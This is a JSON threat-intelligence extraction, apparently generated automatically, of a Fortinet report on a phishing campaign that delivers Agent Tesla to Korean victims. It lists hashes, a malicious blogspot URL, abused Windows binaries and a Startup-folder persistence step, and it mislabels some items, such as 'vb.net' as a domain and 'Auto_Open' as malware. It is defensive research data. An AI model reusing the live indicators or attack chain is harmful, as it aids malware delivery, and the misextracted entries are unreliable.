@@ -1,0 +1,1864 @@
+{
+  "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+  "title": "Phishing Campaign Targeting Korean to Deliver Agent Tesla New Variant",
+  "source": null,
+  "published_date": "December 10, 2021",
+  "report_metadata": {
+    "file_name": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021).pdf",
+    "file_path": "/root/APTtext/Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021).pdf",
+    "source_type": "pdf",
+    "char_length": 17978,
+    "report_profile": "reverse_engineering"
+  },
+  "entities": [
+    {
+      "id": "ent_malware_AgentTesla",
+      "type": "Malware",
+      "name": "AgentTesla",
+      "normalized_name": "AgentTesla",
+      "aliases": [
+        "Agent Tesla"
+      ],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_20",
+        "ev_21",
+        "ev_32",
+        "ev_5"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "family": "AgentTesla",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_5",
+      "supporting_evidence_ids": [
+        "ev_20",
+        "ev_32",
+        "ev_21"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Auto_Open",
+      "type": "Malware",
+      "name": "Auto_Open",
+      "normalized_name": "Auto_Open",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_9"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "family": "Auto_Open",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_9",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_Impact",
+      "type": "Campaign",
+      "name": "Impact",
+      "normalized_name": "Impact",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_domain_bitbucket.org",
+      "type": "Domain",
+      "name": "bitbucket.org",
+      "normalized_name": "bitbucket.org",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_72",
+        "ev_74"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "bitbucket.org",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_72",
+      "supporting_evidence_ids": [
+        "ev_74"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_malware_Agent_Tesla",
+      "type": "Malware",
+      "name": "Agent Tesla",
+      "normalized_name": "Agent Tesla",
+      "aliases": [],
+      "confidence": 0.8300000000000001,
+      "evidence_ids": [
+        "ev_20",
+        "ev_21",
+        "ev_32"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_malware_AgentTesla"
+    },
+    {
+      "id": "ent_domain_bitly.com",
+      "type": "Domain",
+      "name": "bitly.com",
+      "normalized_name": "bitly.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_78",
+        "ev_79"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "bitly.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_78",
+      "supporting_evidence_ids": [
+        "ev_79"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_madarbloghogya.blogspot.com",
+      "type": "Domain",
+      "name": "madarbloghogya.blogspot.com",
+      "normalized_name": "madarbloghogya.blogspot.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_80",
+        "ev_81",
+        "ev_82",
+        "ev_83"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "madarbloghogya.blogspot.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_81",
+      "supporting_evidence_ids": [
+        "ev_80",
+        "ev_82",
+        "ev_83"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "reference_ioc"
+    },
+    {
+      "id": "ent_domain_onedayiwillloveyouforever.blogspot.com",
+      "type": "Domain",
+      "name": "onedayiwillloveyouforever.blogspot.com",
+      "normalized_name": "onedayiwillloveyouforever.blogspot.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_59"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "onedayiwillloveyouforever.blogspot.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_59",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "reference_ioc"
+    },
+    {
+      "id": "ent_domain_vb.net",
+      "type": "Domain",
+      "name": "vb.net",
+      "normalized_name": "vb.net",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_5"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "vb.net",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_5",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_https_madarbloghogya.blogspot.com_p_divineback222.html",
+      "type": "URL",
+      "name": "https://madarbloghogya.blogspot.com/p/divineback222.html",
+      "normalized_name": "https://madarbloghogya.blogspot.com/p/divineback222.html",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_80",
+        "ev_82"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "https://madarbloghogya.blogspot.com/p/divineback222.html",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_80",
+      "supporting_evidence_ids": [
+        "ev_82"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "reference_ioc"
+    },
+    {
+      "id": "ent_ioc_sha256_0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C",
+      "type": "SHA256",
+      "name": "0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C",
+      "normalized_name": "0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_77"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_77",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0",
+      "type": "SHA256",
+      "name": "0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0",
+      "normalized_name": "0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_68"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_68",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894",
+      "type": "SHA256",
+      "name": "AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894",
+      "normalized_name": "AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_76"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb",
+      "type": "SHA1",
+      "name": "b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb",
+      "normalized_name": "b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_72"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_72",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_c4ab4d371cd40ce3303b4d33c868122f671fd37c",
+      "type": "SHA1",
+      "name": "c4ab4d371cd40ce3303b4d33c868122f671fd37c",
+      "normalized_name": "c4ab4d371cd40ce3303b4d33c868122f671fd37c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_84",
+        "ev_85"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "c4ab4d371cd40ce3303b4d33c868122f671fd37c",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_84",
+      "supporting_evidence_ids": [
+        "ev_85"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_c73df176f221868c33d4b3033ec04dc173d4ba4c",
+      "type": "SHA1",
+      "name": "c73df176f221868c33d4b3033ec04dc173d4ba4c",
+      "normalized_name": "c73df176f221868c33d4b3033ec04dc173d4ba4c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_74"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "value": "c73df176f221868c33d4b3033ec04dc173d4ba4c",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_74",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_mshat.exe",
+      "type": "File",
+      "name": "mshat.exe",
+      "normalized_name": "mshat.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "mshat.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_58",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "HTML"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_mshta.exe",
+      "type": "File",
+      "name": "mshta.exe",
+      "normalized_name": "mshta.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_59"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "mshta.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_59",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "HTML"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_PowerShell.exe",
+      "type": "File",
+      "name": "PowerShell.exe",
+      "normalized_name": "PowerShell.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_25",
+        "ev_61"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "PowerShell.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_61",
+      "supporting_evidence_ids": [
+        "ev_25"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "UYA-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_RegAsm.exe",
+      "type": "File",
+      "name": "RegAsm.exe",
+      "normalized_name": "RegAsm.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_62",
+        "ev_63",
+        "ev_64",
+        "ev_65"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "RegAsm.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_62",
+      "supporting_evidence_ids": [
+        "ev_63",
+        "ev_64",
+        "ev_65"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "CREATE_SUSPENDED"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_UYA-update.vbs",
+      "type": "File",
+      "name": "UYA-update.vbs",
+      "normalized_name": "UYA-update.vbs",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_22",
+        "ev_24",
+        "ev_57",
+        "ev_61"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "UYA-update.vbs",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_22",
+      "supporting_evidence_ids": [
+        "ev_61",
+        "ev_57",
+        "ev_24"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "UYA-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_VBS_AgentTesla.VTO_tr.dldr",
+      "type": "File",
+      "name": "VBS/AgentTesla.VTO!tr.dldr",
+      "normalized_name": "VBS/AgentTesla.VTO!tr.dldr",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_51"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "VBS/AgentTesla.VTO!tr.dldr",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_51",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file__.ppa",
+      "type": "File",
+      "name": "새 구매 주문서 .ppa",
+      "normalized_name": "새 구매 주문서 .ppa",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_57"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "file_name": "새 구매 주문서 .ppa",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_57",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "UYA-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_victim_Korean",
+      "type": "Victim",
+      "name": "Korean",
+      "normalized_name": "Korean",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_2",
+        "ev_46"
+      ],
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_46",
+      "supporting_evidence_ids": [
+        "ev_2"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "alias_of",
+      "head_id": "ent_malware_Agent_Tesla",
+      "tail_id": "ent_malware_AgentTesla",
+      "head_type": "Malware",
+      "tail_type": "Malware",
+      "confidence": 1.0,
+      "evidence_ids": [
+        "ev_20",
+        "ev_21"
+      ],
+      "primary_evidence_id": "ev_20",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity; llm_sentence",
+        "schema_version": "v3.1-projector",
+        "evidence_span": "Agent Tesla"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "downloads",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_RegAsm.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.9,
+      "evidence_ids": [
+        "ev_62"
+      ],
+      "primary_evidence_id": "ev_62",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloaded",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_62"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "downloads",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_UYA-update.vbs",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.8,
+      "evidence_ids": [
+        "ev_22"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "llm_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "command_and_control",
+        "notes": "download_head",
+        "schema_version": "v3.0-evidence-reasoner",
+        "evidence_span": "To keep Agent Tesla alive on the victim’s system, it copies the downloaded standalone VBS file “UYA-update.vbs” into the StartMenu’s Startup folder and renames it as “GTQ.vbs”."
+      },
+      "head": {
+        "id": "ent_malware_AgentTesla",
+        "type": "Malware",
+        "name": "AgentTesla",
+        "normalized_name": "AgentTesla",
+        "aliases": [
+          "Agent Tesla"
+        ],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_20",
+          "ev_21",
+          "ev_32",
+          "ev_5"
+        ],
+        "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+        "family": "AgentTesla",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_5",
+        "supporting_evidence_ids": [
+          "ev_20",
+          "ev_32",
+          "ev_21"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_UYA-update.vbs",
+        "type": "File",
+        "name": "UYA-update.vbs",
+        "normalized_name": "UYA-update.vbs",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_22",
+          "ev_24",
+          "ev_57",
+          "ev_61"
+        ],
+        "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+        "file_name": "UYA-update.vbs",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_22",
+        "supporting_evidence_ids": [
+          "ev_61",
+          "ev_57",
+          "ev_24"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "family_hints": [
+          "UYA-"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_UYA-update.vbs",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_22"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "drops",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_RegAsm.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_64"
+      ],
+      "primary_evidence_id": "ev_64",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_64"
+      },
+      "head": {
+        "id": "ent_malware_AgentTesla",
+        "type": "Malware",
+        "name": "AgentTesla",
+        "normalized_name": "AgentTesla",
+        "aliases": [
+          "Agent Tesla"
+        ],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_20",
+          "ev_21",
+          "ev_32",
+          "ev_5"
+        ],
+        "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+        "family": "AgentTesla",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_5",
+        "supporting_evidence_ids": [
+          "ev_20",
+          "ev_32",
+          "ev_21"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_RegAsm.exe",
+        "type": "File",
+        "name": "RegAsm.exe",
+        "normalized_name": "RegAsm.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_62",
+          "ev_63",
+          "ev_64",
+          "ev_65"
+        ],
+        "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+        "file_name": "RegAsm.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_62",
+        "supporting_evidence_ids": [
+          "ev_63",
+          "ev_64",
+          "ev_65"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "abused_legitimate_file",
+        "is_likely_legitimate": true,
+        "family_hints": [
+          "CREATE_SUSPENDED"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0006",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "executes",
+      "head_id": "ent_file_RegAsm.exe",
+      "tail_id": "ent_malware_AgentTesla",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_33",
+        "ev_65"
+      ],
+      "primary_evidence_id": "ev_33",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0007",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "executes",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_UYA-update.vbs",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_22"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_execute",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0008",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "executes",
+      "head_id": "ent_malware_AgentTesla",
+      "tail_id": "ent_file_VBS_AgentTesla.VTO_tr.dldr",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_51"
+      ],
+      "primary_evidence_id": "ev_51",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_execute",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0009",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "loads",
+      "head_id": "ent_file_PowerShell.exe",
+      "tail_id": "ent_malware_AgentTesla",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_25",
+        "ev_61"
+      ],
+      "primary_evidence_id": "ev_25",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0010",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "loads",
+      "head_id": "ent_file_RegAsm.exe",
+      "tail_id": "ent_malware_AgentTesla",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_33",
+        "ev_65"
+      ],
+      "primary_evidence_id": "ev_33",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
